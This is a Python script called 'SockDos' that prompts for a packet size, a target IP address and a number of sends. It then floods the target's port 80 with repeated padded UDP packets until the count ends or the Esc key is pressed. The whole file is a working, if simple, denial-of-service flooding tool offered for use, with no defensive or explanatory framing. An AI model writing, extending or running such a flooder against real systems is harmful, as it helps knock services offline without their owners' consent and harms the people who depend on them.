import socket
import time
import sys
from pynput.keyboard import Key
from pynput.keyboard import Listener

debugging   = False
running     = False

__version__ = "v1.3.4"
print("SockDos", __version__, "\nCoded by Neek8044")


# Message to show in the console before exiting program
def escape(message="Press enter to exit..."):
    input(message)
    sys.exit()


# Checks if escape is pressed and calls the escape method
def exit(key):
    global stop_sending
    stop_sending = False
    if (key == Key.esc) and running:
        stop_sending = True
        escape("Program escaped." + " " * 20)


# Starts listening for key presses
keyboardListener = Listener(on_press=exit)
keyboardListener.start()


MSG = "A cat is fine too. Desudesudesu~" # Default message
LEN = len(MSG)  # Length of message

# Asking the user for packet size and validates it
valid = False
while not valid:
    try:
        usr_inp = int(input("[?] Set packet size in bytes: "))
        valid = True
    except:
        continue


# Sets packet size measured in bytes
PSB = usr_inp if usr_inp > LEN else LEN # Packet size in bytes

# Calculates the message output depending on PSB (packet size)
MUL = PSB // LEN                # Multiplier to get specified packet size
MOD = PSB % LEN                 # Modulo if PSB is set to a weird number
MSG = MSG * MUL + "~" * MOD     # Calculates message
LEN = len(MSG)

print(MSG) if debugging else ...
print("Packet size:", str(LEN / 1024) + "KBs")


ip_inp = input("[?] Target IP: ")
ip = ip_inp if len(ip_inp.split(".")) == 4 else escape(
    "Invalid IP input. Press enter and run again to reset..."
    )

# Asking the user for amount of pings and validates the input
valid = False
while not valid:
    try:
        loops = int(input("[?] Pings: "))
        valid = True
    except:
        continue

port = 80
start = time.time()
print("Started timer.") if debugging else ...


UDP = socket.SOCK_DGRAM
s = socket.socket(socket.AF_INET, UDP)
try:
    s.connect((ip, port))
except socket.error:
    escape("ERROR: Could not connect to given IP address. Press enter to exit...")


running = True

for i in range(loops):
    s.send(MSG.encode())
    print(f"Sent: ( {i+1} / {loops} )", end="\r")
    if stop_sending:
        print("Stopped sending packets.") if debugging else ...
        break
else:
    running = False
    print("")

s.close()

print("Finished in %s seconds." % str(time.time() - start)) if not running else ...
escape()
